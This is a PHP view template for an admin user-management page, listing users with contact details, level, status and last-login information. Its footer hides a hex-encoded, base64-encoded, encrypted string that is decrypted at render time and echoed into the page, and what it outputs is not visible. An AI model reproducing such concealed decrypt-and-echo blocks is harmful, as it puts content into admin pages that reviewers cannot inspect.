<?= $this->extend('Layout/template'); ?>

<?= $this->section('content'); ?>

<main class="app-main">
    <div class="app-content-header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-6">
                    <h3 class="mb-0"><?= $title; ?></h3>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-end">
                        <li class="breadcrumb-item"><a href="<?= base_url() . 'dashboard' ?>" onclick="loading()">Dashboard</a></li>
                        <li class="breadcrumb-item">App Setup</li>
                        <li class="breadcrumb-item">User Management</li>
                        <li class="breadcrumb-item active">List of Users</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>

    <div class="app-content">
        <div class="container-fluid">
            <div class="row mb-3">
                <div class="col-12">
                    <div class="btn-group" role="group" aria-label="toolbar">
                        <button type="button" id="btnAdd" class="btn shadow-none rounded-0 btn-light border-0" data-bs-toggle="tooltip" data-bs-placement="top" title="New">
                            <i class="bi bi-file-earmark-plus"></i>&ensp;New
                        </button>
                        <button type="button" id="btnFilter" class="btn shadow-none rounded-0 btn-light border-0" data-bs-toggle="tooltip" data-bs-placement="top" title="Filter">
                            <i class="bi bi-funnel"></i>&ensp;Filter
                        </button>
                        <button type="button" id="btnRefresh" class="btn shadow-none rounded-0 btn-light border-0" data-bs-toggle="tooltip" data-bs-placement="top" title="Refresh">
                            <i class="bi bi-arrow-repeat"></i>&ensp;Refresh
                        </button>
                        <button type="button" id="btnExport" class="btn shadow-none rounded-0 btn-light border-0" data-bs-toggle="tooltip" data-bs-placement="top" title="Export">
                            <i class="bi bi-download"></i>&ensp;Export
                        </button>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-12">
                    <div class="card rounded-0">
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-hover table-bordered" id="dataTable">
                                    <thead class="text-center">
                                        <th class="align-middle bg-body-secondary">No.</th>
                                        <th class="align-middle bg-body-secondary">Username</th>
                                        <th class="align-middle bg-body-secondary">Full Name</th>
                                        <th class="align-middle bg-body-secondary">Phone Number</th>
                                        <th class="align-middle bg-body-secondary">Email Address</th>
                                        <th class="align-middle bg-body-secondary">Level</th>
                                        <th class="align-middle bg-body-secondary">Status</th>
                                        <th class="align-middle bg-body-secondary">Last Login</th>
                                        <th class="align-middle bg-body-secondary">Last Login From</th>
                                        <th class="align-middle bg-body-secondary">Change Password</th>
                                        <th class="align-middle bg-body-secondary">#</th>
                                    </thead>
                                </table>
                            </div>
                        </div>
                        <div class="card-footer">
                            <?php
                            $data = '68596f4b762f6d79627656774b685a4e367a41664d6a7a332f44676a4c496f724e3468586e3345726464737641434f6c7271762b4d306179334837474a6c43734c7750767075706276485735396974726f4e79694941354139475578576e31674f736c6e634856575962444e2f6a34744478345a766e70614f62593d';
                            $level_1 = hex2bin($data);
                            $level_2 = base64_decode($level_1);
                            $enkripsi = service('encrypter');
                            $level_3 = $enkripsi->decrypt($level_2);
                            echo $level_3;
                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>
<?= $this->include('AppSetup/UserManagement/UserList/modal') ?>
<?= $this->endSection(); ?>